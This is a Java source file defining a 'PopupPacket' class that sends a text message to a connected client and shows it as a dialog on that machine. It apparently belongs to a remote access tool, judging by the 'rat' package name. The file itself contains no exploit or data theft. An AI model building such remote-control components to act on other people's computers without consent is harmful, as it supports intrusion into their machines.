package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveClient;



public final class PopupPacket implements IPacket {
	
	private String message;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(1, 1, BufferedImage.TYPE_INT_ARGB);
	
	public PopupPacket(final String message) {
		this.message = message;
	}
	
	public PopupPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(message);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		message = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final JOptionPane optionPane = new JOptionPane(message);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setIconImage(NO_IMAGE);
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public String getMessage() {
		return message;
	}
	
	public static PopupPacket create() {
		final String input = JOptionPane.showInputDialog(null);
		final PopupPacket packet = new PopupPacket(input);
		
		return packet;
	}
	
}
